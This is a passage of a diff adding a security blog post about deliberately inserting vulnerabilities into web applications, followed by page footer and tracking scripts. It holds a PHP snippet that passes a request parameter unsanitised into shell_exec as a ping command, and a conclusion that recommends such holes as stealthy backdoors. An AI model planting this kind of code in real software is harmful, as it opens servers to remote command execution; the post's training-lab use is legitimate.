+</span><span class='line'>        <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$<em>POST</span><span class="p">[</span> <span class="s1">&#39;submit&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span>
+</span><span class='line'>        <span class="p">{</span>
+</span><span class='line'>        <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$</em>REQUEST</span><span class="p">[</span> <span class="s1">&#39;ip&#39;</span> <span class="p">];</span>
+</span><span class='line'>        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span> <span class="s1">&#39;ping  -c 3 &#39;</span> <span class="o">.</span> <span class="nv">$target</span> <span class="p">);</span>
+</span><span class='line'>      <span class="k">echo</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>    <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">   </span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><h2>Conclusion</h2></p>
+
+<p><p>In this article we looked at how we can insert vulnerabilities in web applications. We took some of the popular open source applications like Joomla and phpMyAdmin as the example, learnt how it protected itself from various common exploits and then bypassed those protection mechanisms to make the application vulnerable. Inserting vulnerabilities can be useful for many reasons, a company might want to set up a test environment for it&rsquo;s users to test their Web Application Security skills, or because an attacker who has already broken into the web application might want to leave a backdoor so that he can get access later. Hence, instead of leaving behind a standalone backdoor which stands apart from all the web applications on the server and could be easily detected , inserting a vulnerability in a web application is a much better option because of the stealth involved in this case.</p></p>
+
+<p><h2>References:</h2>
+<ul>
+<li><p>PHP: The configuration file &ndash; Manual</br><a href="http://php.net/manual/en/configuration.file.php">http://php.net/manual/en/configuration.file.php</a></p>
+</li></p>
+
+<p><li><p>Cross-site_request_forgery</br><a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">http://en.wikipedia.org/wiki/Cross-site_request_forgery</a></p></li></p>
+
+<p>&lt;/ul</p>
+
+<p><p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p></p>
+
+    </div>
+  </div>
+
+
+
+  <footer>
+    <hr>
+    
+    <div class="row-fluid">
+      
+      <div class="span6">
+        <p class="meta">
+        
+        
+
+
+
+  <a href="//categories/security/"><span class="badge">security</span></a>
+
+  <a href="//categories/web-application-security/"><span class="badge">web-application-security</span></a>
+
+
+
+
+        </p>
+      </div>
+      
+      <div class="span6 social-sharing">
+        <div class="sharing">
+  <div class="addthis_toolbox addthis_default_style ">
+  
+  <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+  
+  
+  <a class="addthis_button_tweet"></a>
+  
+  
+  <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+      </div>
+      
+      
+    </div>
+    
+    <div class="row-fluid">
+      <div class="span12">
+        <p class="meta">
+          
+            <a class="basic-alignment left" href="/2013/06/13/w3af-walkthrough-and-tutorial-part-4-w3af-tools" title="Previous Post: w3af walkthrough and tutorial part 4 - w3af tools">&laquo; w3af walkthrough and tutorial part 4 - w3af tools</a>
+          
+          
+            <a class="basic-alignment right" href="/2013/06/13/scanning-the-web-with-ammonite" title="Next Post: Scanning the web with Ammonite">Scanning the web with Ammonite &raquo;</a>
+          
+        </p>
+      </div>
+    </div>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+
+
+        </div>
+      </div>
+      <div class="row-fluid">
+        <footer class="footer-page" role="contentinfo">
+          <p>
+  Copyright &copy; 2014 - Prateek Gianchandani -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span> - Theme by <a href="http://alexgaribay.com">Alex Garibay</a>
+</p>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-41877509-1', 'highaltitudehacks.com');
+  ga('send', 'pageview');
+
+</script>
+
+<!-- Start of StatCounter Code for Default Guide -->
+<script type="text/javascript">
+var sc_project=9078428; 
+var sc_invisible=1; 
+var sc_security="a08bf0bd"; 
+var scJsHost = (("https:" == document.location.protocol) ?
+"https://secure." : "http://www.");
+document.write("<sc"+"ript type='text/javascript' src='" +
+scJsHost+
+"statcounter.com/counter/counter.js'></"+"script>");
+</script>
+<noscript><div class="statcounter"><a title="web analytics"
+href="http://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="http://c.statcounter.com/9078428/0/a08bf0bd/1/"
+alt="web analytics"></a></div></noscript>
+<!-- End of StatCounter Code for Default Guide -->
+        </footer>
+      </div>
+    </div>
+  </div>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'highaltitudehacks';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://prateek147.github.io/2013/06/13/inserting-vulnerabilities-in-web-applications';
+        var disqus_url = 'http://prateek147.github.io/2013/06/13/inserting-vulnerabilities-in-web-applications';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
